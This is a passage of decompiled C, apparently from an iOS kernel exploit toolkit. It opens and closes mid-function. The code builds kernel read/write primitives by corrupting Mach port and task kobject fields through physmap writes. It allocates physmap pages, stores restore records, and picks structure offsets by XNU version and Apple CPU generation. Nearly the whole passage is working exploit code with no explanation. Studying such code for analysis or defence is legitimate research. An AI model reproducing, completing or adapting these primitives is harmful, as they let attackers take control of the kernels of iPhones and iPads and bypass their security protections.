          && kread_physmap_decorated(krwCtx, v13 + 24, &v13)
          && kread_physmap_decorated(krwCtx, v13 + 32, &v13)
          && kread_physmap_decorated(krwCtx, v13 + krwCtx->stride_0x168, &v13)
          && kread_physmap_decorated(krwCtx, v13 + 24, (unsigned __int64 *)&v12) )
        {
          v12 = validate_kaddr_range(krwCtx, v12);
          if ( v12 )
          {
            if ( !kwrite64(krwCtx, v13 + 24, 0) )
              v12 = 0;
          }
        }
      }
    }
    if ( v15 )
      free(v15);
    if ( v10 + 1 >= 2 )
      mach_port_destroy(mach_task_self_, v10);
    if ( name[0] + 1 >= 2 )
      mach_port_destroy(mach_task_self_, name[0]);
    return (uint64_t *)v12;
  }
  return result;
}

//----- (0000000000036E4C) ----------------------------------------------------
__int64 __fastcall map_shared_mem_and_transfer_data(struct_krwCtx *krwCtx, __int64 a2, __int64 size)
{
  __int64 v6; // x19
  kern_return_t v7; // w0
  unsigned int v8; // w24
  kern_return_t v9; // w0
  mach_port_name_t v10; // w22
  __int64 v11; // x0
  int v12; // w0
  uint64_t *v13; // x10
  uint64_t *v14; // x9
  uint64_t *v15; // x8
  void *v16; // x27
  __int64 v17; // x0
  mach_port_t v18; // w0
  mach_port_name_t v19; // w1
  int v20; // w8
  __int64 v22; // x0
  __int64 v23; // x19
  void *v24; // x0
  void *v25; // x22
  int v26; // w24
  __int64 v27; // x26
  __int64 v28; // x25
  __int64 v29; // x0
  __int64 v30; // x0
  mach_vm_address_t v31; // x27
  unsigned __int64 v32; // x8
  __int64 v33; // x8
  kern_return_t v34; // w0
  mach_port_name_t name; // [xsp+4h] [xbp-6Ch] BYREF
  vm_address_t address[3]; // [xsp+8h] [xbp-68h] BYREF

  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8020, 120, 0, 0, 0) )
  {
    v6 = 708609;
    address[0] = 0;
    if ( (size & 0xF) != 0 )
      return v6;
    v7 = vm_allocate(mach_task_self_, address, (unsigned int)size, 1);
    if ( v7 )
    {
      v8 = 0;
      v6 = v7 | 0x80000000;
      goto LABEL_30;
    }
    v12 = pthread_mutex_lock(&krwCtx->someMutex2);
    if ( !v12 )
    {
      v13 = (uint64_t *)krwCtx->restoreRecordListHead;
      if ( v13 )
      {
        v14 = 0;
        v15 = &krwCtx->restoreRecordListHead;
        while ( 1 )
        {
          v16 = v13;
          if ( v13[1] == a2 && *((uint32_t *)v13 + 6) == (uint32_t)size )
            break;
          v13 = (uint64_t *)*v13;
          v14 = v16;
          if ( !*(uint64_t *)v16 )
            goto LABEL_15;
        }
        if ( v14 )
          v15 = v14;
        *v15 = *v13;
        v12 = pthread_mutex_unlock(&krwCtx->someMutex2);
        if ( v12 )
          goto LABEL_26;
        v6 = 163856;
        v27 = *((uint64_t *)v16 + 4);
        v28 = *((uint64_t *)v16 + 2);
        v8 = *((uint32_t *)v16 + 7);
        free(v16);
        v29 = task_self_get_ipc_port(krwCtx, v8);
        if ( v29 )
        {
          v30 = ipc_port_kobject_field_offset(krwCtx, v29);
          if ( v30 && (v31 = v30 + 3LL * krwCtx->stride_0x168) != 0 )
          {
            if ( (unsigned int)kwrite_with_retry(krwCtx, a2, address[0], size) )
            {
              v32 = krwCtx->xnuVersionPacked;
              if ( v32 > XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023)
                || (v32 < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) || krwCtx->xnuMajorVersion >= 8792
                  ? (v33 = krwCtx->stride_0x168)
                  : (v33 = 0),
                    kwrite64(krwCtx, v33 + a2, v27)) )
              {
                if ( kwrite64(krwCtx, v31, v28) )
                {
                  v34 = mach_port_mod_refs(mach_task_self_, v8, 1u, -1);
                  if ( v34 )
                  {
                    v6 = v34 | 0x80000000;
                  }
                  else
                  {
                    v8 = 0;
                    v6 = 0;
                  }
                }
              }
            }
          }
          else
          {
            v6 = 163878;
          }
        }
        else
        {
          v6 = 163854;
        }
LABEL_30:
        if ( address[0] )
          vm_deallocate(mach_task_self_, address[0], (unsigned int)size);
        if ( v8 + 1 >= 2 )
        {
          v18 = mach_task_self_;
          v19 = v8;
LABEL_34:
          mach_port_mod_refs(v18, v19, 1u, -1);
          return v6;
        }
        return v6;
      }
LABEL_15:
      v12 = pthread_mutex_unlock(&krwCtx->someMutex2);
      if ( !v12 )
      {
        v8 = 0;
        v6 = 708625;
        goto LABEL_30;
      }
    }
LABEL_26:
    v8 = 0;
    if ( v12 >= 0 )
      v20 = v12;
    else
      v20 = -v12;
    v6 = v20 | 0x40000000u;
    goto LABEL_30;
  }
  name = 0;
  v9 = mach_port_allocate(mach_task_self_, 1u, &name);
  if ( !v9 )
  {
    v10 = name;
    v11 = init_krw_ctx_fields((__int64)address);
    if ( (uint32_t)v11 )
    {
      v6 = v11;
    }
    else
    {
      krw_ctx_buf_append_typed_val((__int64)address, -1);
      if ( (uint32_t)v17 )
      {
        v6 = v17;
        free_krw_ctx_flags((__int64)address);
      }
      else
      {
        v6 = send_mach_msg_from_ctx((__int64)address, 0, v10, 0);
        free_krw_ctx_flags((__int64)address);
        if ( !(uint32_t)v6 )
        {
          LOBYTE(address[0]) = 2;
          if ( !((unsigned int)size % krwCtx->stride_0x168)
            && (v22 = kread_mach_task_port_slot_plus80(krwCtx, name)) != 0
            && (v23 = v22, (v24 = calloc((unsigned int)size, 1u)) != 0)
            && (v25 = v24, v26 = kwrite_with_retry(krwCtx, a2, (__int64)v24, size), free(v25), v26)
            && kwrite_physmap_with_a3_ptr(krwCtx, v23 + 36, a2)
            && noppl_kwrite32(krwCtx, v23 + 48, (unsigned int)size / krwCtx->stride_0x168) )
          {
            if ( (unsigned int)kwrite_with_retry(krwCtx, v23 + 47, (__int64)address, 1) )
              v6 = 0;
            else
              v6 = 4097;
          }
          else
          {
            v6 = 4097;
          }
        }
      }
    }
    v18 = mach_task_self_;
    v19 = name;
    goto LABEL_34;
  }
  return v9 | 0x80000000;
}
// 36F80: variable 'v17' is possibly undefined

static __int64 cleanup_restore_record_metadata_only(struct_krwCtx *krwCtx, __int64 a2, __int64 size)
{
  int lock_result;
  uint64_t *node;
  uint64_t *prev;
  uint64_t *link;
  __int64 saved_a2uint64_t;
  __int64 saved_taskuint64_t;
  __int64 task_port;
  __int64 task_port_object;
  __int64 task_port_restore_addr;
  unsigned __int64 version;
  __int64 a2_restore_offset;
  mach_port_name_t receive_right;
  __int64 result;

  lock_result = pthread_mutex_lock(&krwCtx->someMutex2);
  if ( lock_result )
    return (lock_result < 0 ? -lock_result : lock_result) | 0x40000000u;

  node = (uint64_t *)krwCtx->restoreRecordListHead;
  prev = 0;
  link = &krwCtx->restoreRecordListHead;
  while ( node )
  {
    if ( node[1] == a2 && *((uint32_t *)node + 6) == (uint32_t)size )
      break;
    prev = node;
    node = (uint64_t *)*node;
  }

  if ( node )
  {
    if ( prev )
      link = prev;
    *link = *node;
  }

  lock_result = pthread_mutex_unlock(&krwCtx->someMutex2);
  if ( lock_result )
    return (lock_result < 0 ? -lock_result : lock_result) | 0x40000000u;

  if ( !node )
    return 0;

  saved_a2uint64_t = node[4];
  saved_taskuint64_t = node[2];
  receive_right = *((uint32_t *)node + 7);
  free(node);

  result = 163856;
  task_port = task_self_get_ipc_port(krwCtx, receive_right);
  if ( !task_port )
  {
    result = 163854;
    goto out_release_right;
  }

  task_port_object = ipc_port_kobject_field_offset(krwCtx, task_port);
  if ( !task_port_object )
  {
    result = 163878;
    goto out_release_right;
  }

  task_port_restore_addr = task_port_object + 3LL * krwCtx->stride_0x168;
  if ( !task_port_restore_addr )
  {
    result = 163878;
    goto out_release_right;
  }

  version = krwCtx->xnuVersionPacked;
  if ( version <= XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023) )
  {
    if ( version < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) || krwCtx->xnuMajorVersion >= 8792 )
      a2_restore_offset = krwCtx->stride_0x168;
    else
      a2_restore_offset = 0;
    if ( !kwrite64(krwCtx, a2 + a2_restore_offset, saved_a2uint64_t) )
      goto out_release_right;
  }

  if ( kwrite64(krwCtx, task_port_restore_addr, saved_taskuint64_t) )
    result = 0;

out_release_right:
  if ( receive_right + 1 >= 2 )
    mach_port_mod_refs(mach_task_self_, receive_right, MACH_PORT_RIGHT_RECEIVE, -1);
  return result;
}

//----- (0000000000037210) ----------------------------------------------------
unsigned __int64 __fastcall alloc_physmap_page(struct_krwCtx *krwCtx, unsigned int *a2)
{
  unsigned int v4; // w24
  unsigned __int64 v5; // x8
  __int64 v6; // x28
  __int64 v7; // x27
  unsigned int v8; // w0
  unsigned int v9; // w8
  int v10; // w9
  int v11; // w8
  unsigned int v12; // w8
  int v13; // w9
  int v14; // w8
  int v15; // w21
  unsigned int v16; // w22
  void *v17; // x0
  void *v18; // x21
  mach_port_t v19; // w23
  int v20; // w22
  __int64 v21; // x0
  unsigned __int64 v22; // x22
  mach_port_name_t v23; // w1
  mach_port_t v24; // w0
  __int64 v25; // x0
  __int64 v26; // x0
  unsigned __int64 v27; // x21
  unsigned int v28; // w23
  unsigned __int64 v29; // x23
  int v30; // w0
  unsigned int v31; // w22
  int v32; // w8
  int v33; // w10
  unsigned int v34; // w8
  int v35; // w11
  void *v36; // x0
  mach_port_t v37; // w23
  uint64_t *v39; // x0
  void *v40; // x21
  mach_port_name_t v41; // w8
  int v42; // w22
  mach_port_name_t v43; // w23
  unsigned __int64 v44; // x8
  bool v45; // cc
  __int64 v46; // x8
  unsigned __int64 v47; // x23
  unsigned __int64 v48; // x26
  int v49; // w0
  __int64 v50; // x0
  __int64 *v51; // x9
  uint64_t *v52; // x8
  unsigned int v53; // [xsp+4h] [xbp-8Ch]
  int v54; // [xsp+8h] [xbp-88h] BYREF
  unsigned int v55; // [xsp+Ch] [xbp-84h] BYREF
  mach_port_name_t name[2]; // [xsp+10h] [xbp-80h] BYREF
  mach_port_t previous; // [xsp+1Ch] [xbp-74h] BYREF
  mach_port_name_t v58[2]; // [xsp+20h] [xbp-70h] BYREF
  unsigned __int64 v59[3]; // [xsp+28h] [xbp-68h] BYREF

  v4 = *a2;
  v5 = krwCtx->xnuVersionPacked;
  if ( v5 >= XNU_VERSION_PACKED(8020, 120, 0, 0, 0) )
  {
    *(uint64_t *)v58 = 0;
    previous = 0;
    *(uint64_t *)name = 0;
    if ( v5 > XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023) || (v5 >= XNU_VERSION_PACKED(8020, 241, 8, 0, 0) && krwCtx->xnuMajorVersion <= 8791) )
    {
      v6 = 0;
      v7 = krwCtx->stride_0x168;
    }
    else
    {
      v7 = 0;
      v6 = krwCtx->stride_0x168;
    }
    if ( mach_port_allocate(mach_task_self_, 1u, &v58[1]) )
      goto LABEL_29;
    v25 = task_self_get_ipc_port(krwCtx, v58[1]);
    if ( !v25 )
      goto LABEL_29;
    v26 = ipc_port_kobject_field_offset(krwCtx, v25);
    if ( !v26 )
      goto LABEL_29;
    v27 = v26 + 3LL * krwCtx->stride_0x168;
    if ( !v27 || mach_port_allocate(mach_task_self_, 1u, v58) )
      goto LABEL_29;
    while ( 1 )
    {
      if ( mach_port_request_notification(mach_task_self_, v58[1], 72, 0, v58[0], 0x15u, &previous)
        || mach_port_request_notification(mach_task_self_, v58[1], 72, 0, 0, 0x15u, &previous) )
      {
        goto LABEL_29;
      }
      if ( previous + 1 >= 2 )
      {
        if ( mach_port_deallocate(mach_task_self_, previous) )
          goto LABEL_29;
        previous = 0;
      }
      if ( !kread64_internal(krwCtx, v27, v59) )
        goto LABEL_29;
      v22 = maybe_sptm_translate_kaddr(krwCtx, v59[0]);
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023) )
        v22 = decode_pte_to_physmap_addr(krwCtx, v22, &v55);
      if ( !validate_kaddr_range(krwCtx, v22) )
        goto LABEL_29;
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023) )
      {
        if ( !kread64_internal(krwCtx, v22 + v6, name) )
          goto LABEL_29;
        v29 = maybe_sptm_translate_kaddr(krwCtx, *(__int64 *)name);
        if ( !check_kaddr_in_physmap(krwCtx, v29)
          || !(unsigned int)krw_read_thunk(krwCtx, v29, 4, &v55) )
        {
          goto LABEL_29;
        }
        v28 = 16 * v55;
      }
      else
      {
        v28 = v55;
      }
      if ( v28 >= v4 )
        break;
      v54 = 0;
      if ( !(unsigned int)kwrite_with_retry(krwCtx, v22 + v7, (__int64)&v54, 4) )
        goto LABEL_29;
    }
    if ( kwrite_physmap_with_a3_ptr(krwCtx, v27, 0) && (v39 = malloc(0x28u)) != 0 )
    {
      v40 = v39;
      *v39 = 0;
      v39[1] = v22;
      v39[2] = v59[0];
      v41 = v58[1];
      *((uint32_t *)v39 + 6) = v28;
      *((uint32_t *)v39 + 7) = v41;
      v39[4] = *(uint64_t *)name;
      v58[1] = 0;
      if ( pthread_mutex_lock(&krwCtx->someMutex2) )
      {
LABEL_90:
        free(v40);
        goto LABEL_29;
      }
      v51 = (__int64 *)krwCtx->restoreRecordListHead;
      if ( v51 )
      {
        while ( 1 )
        {
          v52 = v51;
          if ( v51[1] == v22 && *((uint32_t *)v51 + 6) == v28 )
            break;
          v51 = (__int64 *)*v51;
          if ( !*v52 )
            goto LABEL_112;
        }
        pthread_mutex_unlock(&krwCtx->someMutex2);
        goto LABEL_90;
      }
      v52 = &krwCtx->restoreRecordListHead;
LABEL_112:
      *v52 = v40;
      if ( pthread_mutex_unlock(&krwCtx->someMutex2) )
        v22 = 0;
      else
        v4 = v28;
    }
    else
    {
LABEL_29:
      v22 = 0;
    }
    if ( v58[1] + 1 >= 2 )
      mach_port_mod_refs(mach_task_self_, v58[1], 1u, -1);
    v23 = v58[0];
    if ( v58[0] + 1 < 2 )
      goto LABEL_83;
    v24 = mach_task_self_;
    goto LABEL_82;
  }
  v8 = compute_kobj_scan_halfstride(krwCtx);
  if ( !v8 )
    return 0;
  if ( v4 >= v8 )
  {
    v9 = krwCtx->pageSizeOrSomething;
    v10 = v4 % v9;
    v11 = v9 - v4 % v9;
    if ( !v10 )
      v11 = 0;
    v4 += v11;
  }
  v12 = krwCtx->stride_0x168;
  if ( v4 >= 0x3FFF * v12 )
  {
    name[0] = 0;
    if ( !mach_port_allocate(mach_task_self_, 1u, name) )
    {
      v30 = get_task_port_offset(krwCtx);
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
      {
        v31 = -36;
        if ( v4 >= 0x25 && v30 + 104 <= v4 )
        {
          if ( v4 < 0x29 )
            goto LABEL_80;
          if ( v30 + 108 <= v4 )
          {
            v33 = 108;
            v34 = 4;
            do
            {
              v35 = v33;
              if ( v33 - 64 >= v4 )
                break;
              v33 += 4;
              v34 += 4;
            }
            while ( v30 + ((v34 / 3) & 0x7FFFFFFC) + v33 <= v4 );
            v32 = v35 - 68;
          }
          else
          {
            v32 = 36;
          }
          v31 = v32 - 36;
          if ( v32 == 36 )
            goto LABEL_80;
        }
      }
      else
      {
        v31 = v4 + 76;
        if ( v4 + 76 <= 256 - v30 )
          goto LABEL_80;
      }
      v36 = calloc(v31, 1u);
      if ( v36 )
      {
        v18 = v36;
        if ( (v31 & 3) != 0 )
          goto LABEL_78;
        v37 = name[0];
        if ( (unsigned int)init_krw_ctx_fields((__int64)v59) )
          goto LABEL_78;
        if ( !(unsigned int)buf_append_data((__int64)v59, v18, v31) )
        {
          v42 = send_mach_msg_from_ctx((__int64)v59, 0, v37, 0);
          free_krw_ctx_flags((__int64)v59);
          if ( !v42 )
          {
            v43 = name[0];
            v22 = get_mach_task_port_slot(krwCtx, name[0]);
            if ( !v22 )
              goto LABEL_79;
            if ( kread_physmap_decorated(krwCtx, v22, v59) && validate_kaddr_range(krwCtx, v59[0]) )
            {
              v53 = v43;
              v44 = krwCtx->xnuVersionPacked;
              if ( v44 < XNU_VERSION_PACKED(7195, 42, 1, 0, 0) )
                goto LABEL_100;
              v45 = v44 > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
              v46 = 24;
              if ( v45 )
                v46 = 16;
              if ( kread_physmap_decorated(krwCtx, v59[0] + v46, v59) && validate_kaddr_range(krwCtx, v59[0]) )
              {
LABEL_100:
                v47 = v22;
                v48 = v22 + 8;
                v49 = krw_read_thunk(krwCtx, v22 + 8 + krwCtx->stride_0x168, 2, &v58[1]);
                v22 = 0;
                if ( !v49 || LOWORD(v58[1]) != 1 )
                  goto LABEL_79;
                if ( kwrite_physmap_with_a3_ptr(krwCtx, v47, 0) )
                {
                  LOWORD(v58[1]) = 0;
                  if ( (unsigned int)kwrite_with_retry(krwCtx, v48 + krwCtx->stride_0x168, (__int64)&v58[1], 2) )
                  {
                    v50 = task_self_get_ipc_port(krwCtx, v53);
                    if ( v50 )
                    {
                      kread_modify_u32_with_delta(krwCtx, v50, -1);
                      v22 = v59[0];
                      goto LABEL_79;
                    }
                  }
                }
              }
            }
          }
          goto LABEL_78;
        }
        goto LABEL_77;
      }
LABEL_80:
      v22 = 0;
      goto LABEL_81;
    }
  }
  else
  {
    name[0] = 0;
    v13 = v4 % v12;
    v14 = v12 - v4 % v12;
    if ( v13 )
      v15 = v14;
    else
      v15 = 0;
    if ( !mach_port_allocate(mach_task_self_, 1u, name) )
    {
      v16 = v15 + v4;
      v17 = calloc(v15 + v4, 1u);
      if ( v17 )
      {
        v18 = v17;
        if ( v16 % krwCtx->stride_0x168 )
          goto LABEL_78;
        v19 = name[0];
        if ( (unsigned int)init_krw_ctx_fields((__int64)v59) )
          goto LABEL_78;
        if ( !(unsigned int)krw_ctx_buf_append_entry((__int64)v59, (__int64)v18, v16 / krwCtx->stride_0x168) )
        {
          v20 = send_mach_msg_from_ctx((__int64)v59, 0, v19, 0);
          free_krw_ctx_flags((__int64)v59);
          if ( !v20 )
          {
            v21 = kread_mach_task_port_slot_plus80(krwCtx, name[0]);
            v22 = v21;
            if ( !v21 )
            {
LABEL_79:
              free(v18);
LABEL_81:
              v24 = mach_task_self_;
              v23 = name[0];
LABEL_82:
              mach_port_mod_refs(v24, v23, 1u, -1);
              goto LABEL_83;
            }
            if ( kread_physmap_decorated(krwCtx, v21 + 36, v59) && validate_kaddr_range(krwCtx, v59[0]) )
            {
              if ( noppl_kwrite32(krwCtx, v22 + 32, 0) )
                v22 = v59[0];
              else
                v22 = 0;
              goto LABEL_79;
            }
          }
LABEL_78:
          v22 = 0;
          goto LABEL_79;
        }
LABEL_77:
        free_krw_ctx_flags((__int64)v59);
        goto LABEL_78;
      }
      goto LABEL_80;
    }
  }
  v22 = 0;
LABEL_83:
  if ( v22 && v4 != *a2 )
    *a2 = v4;
  return v22;
}

//----- (000000000003796C) ----------------------------------------------------
unsigned __int64 __fastcall alloc_physmap_scratch_page(struct_krwCtx *krwCtx, uint32_t *a2)
{
  unsigned __int64 v4; // x19
  vm_size_t v5; // x20
  vm_address_t address; // [xsp+0h] [xbp-40h] BYREF
  vm_size_t size; // [xsp+Ch] [xbp-34h] BYREF

  LODWORD(size) = *a2;
  v4 = alloc_physmap_page(krwCtx, (unsigned int *)&size);
  if ( v4 )
  {
    address = 0;
    v5 = (unsigned int)size;
    if ( vm_allocate(mach_task_self_, &address, (unsigned int)size, 1) )
    {
LABEL_3:
      map_shared_mem_and_transfer_data(krwCtx, v4, v5);
      return 0;
    }
    if ( !(unsigned int)kwrite_with_retry(krwCtx, v4, address, v5) )
    {
      vm_deallocate(mach_task_self_, address, v5);
      goto LABEL_3;
    }
    if ( (uint32_t)v5 != *a2 )
      *a2 = v5;
    vm_deallocate(mach_task_self_, address, v5);
  }
  return v4;
}

//----- (0000000000037A50) ----------------------------------------------------
__int64 __fastcall kwrite_task_kobj_field_via_physmap(struct_krwCtx *krwCtx, unsigned int a2, int a3, int a4, __int16 a5)
{
  __int64 v9; // x19
  unsigned __int64 v10; // x0
  unsigned __int64 v11; // x21
  mach_vm_address_t v12; // x23
  unsigned __int64 v13; // x22
  unsigned __int64 v14; // x23
  __int64 v15; // x21
  unsigned int v17; // [xsp+0h] [xbp-60h] BYREF
  unsigned int v18; // [xsp+4h] [xbp-5Ch] BYREF
  unsigned int v19; // [xsp+8h] [xbp-58h] BYREF
  unsigned int v20; // [xsp+Ch] [xbp-54h] BYREF
  unsigned int v21; // [xsp+10h] [xbp-50h] BYREF
  unsigned int v22; // [xsp+14h] [xbp-4Ch] BYREF
  __int64 v23; // [xsp+18h] [xbp-48h] BYREF
  __int64 v24; // [xsp+20h] [xbp-40h] BYREF
  __int16 v25; // [xsp+2Eh] [xbp-32h] BYREF

  v25 = a5;
  v23 = 0;
  v24 = 0;
  if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
    return 708616;
  v9 = check_krw_capabilities_version((int *)krwCtx, (int *)&v22, (int *)&v21, (int *)&v20, (int *)&v19);
  if ( !(uint32_t)v9 )
  {
    v9 = get_proc_kobj_pair_cached(krwCtx, a3, &v24);
    if ( !(uint32_t)v9 )
    {
      v9 = 163855;
      v10 = get_task_kobject_addr(krwCtx, a2);
      if ( !v10 )
        return 163854;
      v11 = v10;
      v12 = v10 + v22;
      if ( kread_physmap_decorated(krwCtx, v12, (unsigned __int64 *)&v23) )
      {
        if ( v23 && !validate_kaddr_range(krwCtx, v23) )
          return 163878;
        if ( !kwrite64(krwCtx, v12, v24) )
          return 163856;
        if ( a4 )
        {
          v13 = v11 + v21;
          if ( !kread_u32(krwCtx, v13, &v18) )
            return v9;
          if ( v18 > 3 )
            return 163857;
          v14 = v11 + v20;
          if ( !kread_u32(krwCtx, v14, &v17) )
            return v9;
          if ( v17 > 0xB71B00 )
            return 163857;
          if ( !noppl_kwrite32(krwCtx, v13, 1) || !noppl_kwrite32(krwCtx, v14, 12000000) )
            return 163856;
        }
        v15 = v11 + v19;
        if ( (unsigned int)krw_read_thunk(krwCtx, v15, 2, &v18) )
        {
          if ( (unsigned __int16)v18 > 0x7Fu )
            return 163857;
          if ( (unsigned int)kwrite_with_retry(krwCtx, v15, (__int64)&v25, 2) )
            return 0;
          else
            return 163856;
        }
      }
    }
  }
  return v9;
}

//----- (0000000000037C50) ----------------------------------------------------
__int64 __fastcall check_krw_capabilities_version(int *a1, int *a2, int *a3, int *a4, int *a5)
{
  int v6; // w11
  __int64 result; // x0
  unsigned __int64 v8; // x10
  int v9; // w9
  int v10; // w8
  bool v11; // zf
  int v12; // w9
  int v13; // w15
  int v14; // w16
  int v15; // w17
  bool v16; // cf
  int v17; // w8
  int v18; // w9
  int v19; // w10
  int v20; // w11
  int v21; // w8
  int v22; // w11
  int v23; // w12
  int v24; // w13
  int v25; // w14
  bool v26; // cc
  int v27; // w10
  int v28; // w16
  bool v29; // zf
  int v30; // w8
  bool v31; // cc
  int v32; // w12
  int v33; // w11

  v6 = 89669633;
  result = 708616LL;
  v8 = *((uint64_t *)a1 + 43);
  v9 = *a1;
  if ( v8 >> 43 >= 0x44B )
    v6 = 89670145;
  if ( (v9 & v6) == 0 )
    return result;
  result = 163884LL;
  v10 = a1[80];
  if ( v10 <= 8791 )
  {
    if ( (unsigned int)(v10 - 8019) >= 2 )
    {
      if ( v10 != 6153 )
      {
        if ( v10 != 7195 )
          return result;
        v11 = (v9 & KRW_CTX_FLAG_CPU_A13_A14_MASK) == 0;
        if ( (v9 & KRW_CTX_FLAG_CPU_A13_A14_MASK) != 0 )
          v12 = 648;
        else
          v12 = 640;
        if ( v11 )
          v13 = 364;
        else
          v13 = 372;
        if ( v11 )
          v14 = 556;
        else
          v14 = 564;
        if ( v11 )
          v15 = 388;
        else
          v15 = 396;
        v16 = v8 >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0);
        if ( v8 >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
          v17 = v12;
        else
          v17 = 448;
        if ( v8 >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
          v18 = v13;
        else
          v18 = 172;
        if ( v8 >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
          v19 = v14;
        else
          v19 = 364;
        if ( v16 )
          v20 = v15;
        else
          v20 = 196;
        goto LABEL_111;
      }
      v31 = v8 > XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023);
      if ( v8 <= XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
        v17 = 424;
      else
        v17 = 416;
      if ( v8 <= XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
        v18 = 172;
      else
        v18 = 164;
      if ( v8 <= XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
        v19 = 340;
      else
        v19 = 332;
      v20 = 196;
      v32 = 188;
      goto LABEL_93;
    }
    if ( (v9 & 0x100000) != 0 )
    {
      v31 = v8 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
      if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
        v18 = 384;
      else
        v18 = 380;
      if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
        v17 = 656;
      else
        v17 = 544;
      if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
        v19 = 560;
      else
        v19 = 452;
      v20 = 400;
      v32 = 404;
LABEL_93:
      if ( v31 )
        v20 = v32;
      goto LABEL_111;
    }
    if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v23 = 368;
    else
      v23 = 364;
    if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v24 = 640;
    else
      v24 = 528;
    if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v25 = 548;
    else
      v25 = 436;
    v26 = v8 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
    if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v27 = 376;
    else
      v27 = 372;
    if ( v26 )
      v17 = 536;
    else
      v17 = 648;
    if ( v26 )
      v28 = 444;
    else
      v28 = 556;
    v29 = (v9 & KRW_CTX_FLAG_CPU_A13_A14_MASK) == 0;
    if ( (v9 & KRW_CTX_FLAG_CPU_A13_A14_MASK) != 0 )
    {
      v18 = v27;
    }
    else
    {
      v17 = v24;
      v18 = v23;
    }
    if ( v29 )
      v19 = v25;
    else
      v19 = v28;
    if ( v29 )
      v20 = 388;
    else
      v20 = 396;
LABEL_111:
    result = 0LL;
    *a2 = v17;
    *a3 = v18;
    *a4 = v19;
    *a5 = v20;
    return result;
  }
  if ( v10 == 8792 || v10 == 8796 )
  {
    v30 = v9 & KRW_CTX_FLAG_CPU_A8_TO_A17_MASK;
    if ( (v9 & KRW_CTX_FLAG_CPU_A8_TO_A17_MASK) >= 0x80000 )
    {
      if ( v30 != 0x80000 )
      {
        if ( v30 != 0x100000 && v30 != 0x1000000 )
          return result;
        v33 = 40;
LABEL_107:
        v17 = v33 + 488;
        v18 = v33 + 340;
        v19 = v33 + 412;
        v20 = v33 + 364;
        goto LABEL_111;
      }
    }
    else
    {
      if ( v30 == 1 )
      {
        v33 = 16;
        goto LABEL_107;
      }
      if ( v30 == 512 )
      {
        v33 = 0;
        goto LABEL_107;
      }
      if ( v30 != 0x4000 )
        return result;
    }
    v33 = 32;
    goto LABEL_107;
  }
  if ( v10 != 10002 )
    return result;
  v21 = v9 & KRW_CTX_FLAG_CPU_A8_TO_A17_MASK;
  if ( (v9 & KRW_CTX_FLAG_CPU_A8_TO_A17_MASK) >= 0x100000 )
  {
    if ( v21 == 0x100000 || v21 == 0x1000000 )
    {
      v22 = 24;
    }
    else
    {
      if ( v21 != 0x4000000 )
        return result;
      v22 = 104;
    }
    goto LABEL_110;
  }
  if ( v21 == 1 )
  {
    v22 = 0;
    goto LABEL_110;
  }
  if ( v21 == 0x4000 || v21 == 0x80000 )
  {
    v22 = 16;
LABEL_110:
    v17 = v22 | 0x200;
    v18 = v22 + 356;
    v19 = v22 + 436;
    v20 = v22 + 380;
    goto LABEL_111;
  }
  return result;
}

//----- (0000000000037F58) ----------------------------------------------------
__int64 __fastcall get_proc_kobj_pair_cached(struct_krwCtx *krwCtx, int a2, uint64_t *a3)
{
  __int64 result; // x0
  __int64 v7; // x8
  unsigned int v8; // [xsp+Ch] [xbp-54h] BYREF
  __int128 v9[2]; // [xsp+10h] [xbp-50h] BYREF

  memset(v9, 0, sizeof(v9));
  v8 = 4;
  if ( !krwCtx->gap_0x248 || !krwCtx->gap_0x250 )
  {
    result = find_proc_kobj_via_processors(krwCtx, 2, (__int64)v9, &v8);
    if ( (uint32_t)result )
      return result;
    if ( v8 < 2 )
      return 163857;
    krwCtx->gap_0x248 = *(uint64_t *)&v9[0];
    krwCtx->gap_0x250 = *((uint64_t *)&v9[0] + 1);
  }
  result = 0;
  v7 = 592;
  if ( a2 )
    v7 = 584;
  *a3 = v7 == 592 ? krwCtx->gap_0x250 : krwCtx->gap_0x248;
  return result;
}

//----- (0000000000038034) ----------------------------------------------------
__int64 __fastcall port_table_lookup_v1(struct_krwCtx *krwCtx, __int64 a2, int a3, int a4, __int16 a5)
{
  __int64 v10; // x21
  __int64 v11; // x24
  __int64 v12; // x1
  __int64 v13; // x10
  unsigned int v15; // [xsp+8h] [xbp-48h] BYREF
  unsigned int v16; // [xsp+Ch] [xbp-44h] BYREF
  unsigned int v17; // [xsp+10h] [xbp-40h] BYREF
  unsigned int v18; // [xsp+14h] [xbp-3Ch] BYREF
  __int64 v19; // [xsp+18h] [xbp-38h] BYREF

  v19 = 0;
  if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
    return 708616;
